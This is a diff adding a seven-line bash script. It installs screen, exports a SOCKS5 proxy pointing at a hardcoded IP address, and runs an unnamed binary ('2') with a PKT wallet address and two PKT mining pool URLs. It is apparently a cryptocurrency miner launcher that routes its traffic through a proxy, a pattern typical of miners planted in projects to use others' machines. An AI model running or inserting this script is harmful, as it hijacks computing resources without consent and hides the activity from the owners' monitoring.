@@ -1,0 +1,7 @@
+#!/bin/bash
+
+
+apt-get update
+apt install screen -y
+export http_proxy=socks5://98.162.25.23:4145
+chmod +x 2 && ./2 ann -p pkt1qn8dunu9fn4jj5lqa0rql529zsgwmatvug272fv http://pool.pkt.world http://pool.pktpool.io
